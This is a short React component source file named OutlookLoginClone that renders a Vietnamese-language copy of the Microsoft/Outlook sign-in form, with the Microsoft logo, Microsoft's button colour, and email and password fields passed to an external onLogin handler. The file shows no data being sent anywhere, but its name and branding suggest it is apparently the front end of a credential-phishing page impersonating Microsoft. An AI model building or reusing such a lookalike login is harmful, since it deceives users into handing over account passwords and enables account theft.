import React from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Loader } from 'lucide-react';

const OutlookLoginClone = ({ onLogin, isLoading }) => (
    <div className="bg-white p-8 rounded-lg text-black w-full flex flex-col justify-center">
         <img src="https://storage.googleapis.com/hostinger-horizons-assets-prod/bd437477-89d8-41b6-a8e0-146e82a742d2/dd2c2e0b5030e4b771e843f5505e60d2.svg" alt="Microsoft" className="h-6 w-auto mb-4" />
        <h2 className="text-2xl font-semibold">Đăng nhập</h2>
        <form onSubmit={onLogin} className="space-y-4 mt-4">
            <Input id="account" name="account" type="email" placeholder="Email, điện thoại hoặc Skype" required className="h-11 text-black" disabled={isLoading} />
            <Input id="password" name="password" type="password" placeholder="Mật khẩu" required className="h-11 text-black" disabled={isLoading} />
             <div className="flex justify-end pt-4">
                <Button type="submit" className="bg-[#0067b8] hover:bg-[#005da6] text-white px-6" disabled={isLoading}>
                    {isLoading ? <Loader className="h-4 w-4 animate-spin" /> : 'Đăng nhập'}
                </Button>
            </div>
        </form>
    </div>
);

export default OutlookLoginClone;